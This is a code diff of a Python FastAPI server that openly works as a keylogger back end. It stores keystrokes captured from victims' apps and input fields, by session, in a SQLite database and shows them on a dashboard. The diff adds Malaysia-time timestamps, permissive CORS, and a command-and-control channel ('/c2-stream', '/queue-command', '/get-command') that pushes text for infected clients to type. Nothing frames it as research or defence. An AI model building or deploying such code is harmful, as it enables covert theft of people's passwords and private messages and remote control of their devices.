@@ -1,18 +1,33 @@
-# main.py - FastAPI server with SQLite3 and Jinja2 Template rendering
+# main.py - FastAPI server with Malaysia Time (UTC+8)
 from typing import Dict
 import sqlite3
+from datetime import datetime, timezone, timedelta
 from fastapi import FastAPI, HTTPException, Request
 from fastapi.responses import HTMLResponse
 from fastapi.templating import Jinja2Templates
+from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
+import asyncio
+from fastapi.responses import StreamingResponse
+
+from tj import app as tj_router
 
 app = FastAPI()
 
-# Setup Jinja2 templates directory
-templates = Jinja2Templates(directory="templates")
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
-# Database initialization
+app.include_router(tj_router, prefix="/tj")
+
+templates = Jinja2Templates(directory="templates")
 DB_FILE = "keystrokes.db"
+
+MY_TIMEZONE = timezone(timedelta(hours=8))
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
@@ -27,13 +42,12 @@ def init_db():
             field_hint TEXT,
             field_name TEXT,
             field_id INTEGER,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            timestamp TEXT
         )
     ''')
     conn.commit()
     conn.close()
 
-# Initialize the database on startup
 init_db()
 
 class KeystrokeData(BaseModel):
@@ -45,7 +59,35 @@ class KeystrokeData(BaseModel):
     field_name: str
     field_id: int
 
-@app.post("/keyogger")
+PENDING_COMMANDS = []
+
+async def event_generator():
+    while True:
+        if PENDING_COMMANDS:
+            text = PENDING_COMMANDS.pop(0)
+            yield f"data: {text}\n\n"
+        await asyncio.sleep(0.2)
+
+@app.get("/c2-stream")
+async def c2_stream():
+    return StreamingResponse(event_generator(), media_type="text/event-stream")
+
+@app.post("/queue-command")
+async def queue_command(data: dict):
+    text_to_type = data.get("text")
+    if text_to_type:
+        PENDING_COMMANDS.append(text_to_type)
+        return {"status": "success", "message": f"Queued: {text_to_type}"}
+    return {"status": "error", "message": "No text provided"}
+
+@app.get("/get-command")
+def get_command():
+    if PENDING_COMMANDS:
+        text_to_inject = PENDING_COMMANDS.pop(0)
+        return {"status": "success", "command": "type", "text": text_to_inject}
+    return {"status": "success", "command": "none"}
+
+@app.post("/keylogger")
 async def log_keystroke(data: Dict):
     try:
         recv_data = {
@@ -58,12 +100,13 @@ async def log_keystroke(data: Dict):
             'field_id': data.get('field_id'),
         }
 
-        # Store in SQLite3
+        malaysia_time = datetime.now(MY_TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
+
         conn = sqlite3.connect(DB_FILE)
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO keystrokes (session_id, key_val, app_name, app_id, field_hint, field_name, field_id)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO keystrokes (session_id, key_val, app_name, app_id, field_hint, field_name, field_id, timestamp)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             recv_data['session_id'],
             recv_data['key'],
@@ -71,25 +114,23 @@ async def log_keystroke(data: Dict):
             recv_data['app_id'],
             recv_data['field_hint'],
             recv_data['field_name'],
-            recv_data['field_id']
+            recv_data['field_id'],
+            malaysia_time
         ))
         conn.commit()
         conn.close()
 
-        print(f"Stored & Received keystroke data: {recv_data}")
-        return {"status": "success", "message": "Keystroke logged and saved to database"}
+        print(f"[{malaysia_time}] Stored keystroke: {recv_data}")
+        return {"status": "success", "message": "Keystroke logged and saved with MYT timestamp"}
     
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/logs")
 async def get_logs():
-    """Endpoint to retrieve grouped keystrokes per session, app, and field"""
     conn = sqlite3.connect(DB_FILE)
     conn.row_factory = sqlite3.Row
     cursor = conn.cursor()
-    
-    # Aggregate keystrokes per session, app, and field hint/name
     cursor.execute("""
         SELECT 
             session_id,
@@ -110,19 +151,8 @@ async def get_logs():
     
     return {"status": "success", "data": [dict(row) for row in rows]}
 
-
-@app.get("/dashboard", response_class=HTMLResponse)
-async def serve_dashboard(request: Request):
-    """Renders and serves the dashboard HTML template using Jinja2"""
-    return templates.TemplateResponse(request, "dashboard.html")
-
-@app.get("/")
-async def root():
-    return {"message": "Keylogger Server with SQLite is running. Visit /dashboard for the live telemetry view."}
-
 @app.delete("/logs/{session_id}")
 async def delete_session_logs(session_id: str):
-    """Deletes all keystroke logs associated with a specific session ID"""
     try:
         conn = sqlite3.connect(DB_FILE)
         cursor = conn.cursor()
@@ -132,6 +162,14 @@ async def delete_session_logs(session_id: str):
         return {"status": "success", "message": f"Session {session_id} deleted successfully"}
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/dashboard", response_class=HTMLResponse)
+async def serve_dashboard(request: Request):
+    return templates.TemplateResponse(request, "dashboard.html")
+
+@app.get("/")
+async def root():
+    return {"message": "Keylogger Server with Malaysia Time (MYT) is running."}
 
 if __name__ == "__main__":
     import uvicorn
